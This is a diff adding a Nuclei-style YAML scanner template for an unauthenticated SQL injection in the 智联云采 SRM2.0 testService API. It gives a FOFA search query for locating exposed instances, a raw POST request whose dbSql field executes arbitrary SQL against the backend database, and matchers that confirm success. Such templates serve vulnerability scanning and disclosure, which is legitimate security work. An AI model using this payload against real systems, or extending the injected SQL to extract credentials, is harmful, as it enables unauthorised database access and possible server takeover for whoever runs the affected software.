@@ -1,0 +1,46 @@
+id: zhilianyuncai-SRM2-testService-sql
+
+info:
+  tags: zhilianyuncai-SRM2-testService-sql
+  name: 智联云采 SRM2.0 testService SQL注入漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: title=="SRM 2.0"
+    智联云采 SRM2.0 testService 接口处存在SQL注入漏洞，未经身份认证的攻击者可以通过此漏洞获取数据库敏感信息，用户名密码等凭据，进一步利用可获取服务器权限。
+
+
+
+http:
+  - raw:
+      - |
+        POST /adpweb/a/ica/api/testService HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+
+        {
+            "dbId": "1001",
+            "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
+            "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+            "serviceCode": "q",
+            "serviceName": "q",
+            "serviceParams": "{\"lang\":\"zh_CN\"}"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"description":"执行成功！"'
+          - '"sqlcode":"0"'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
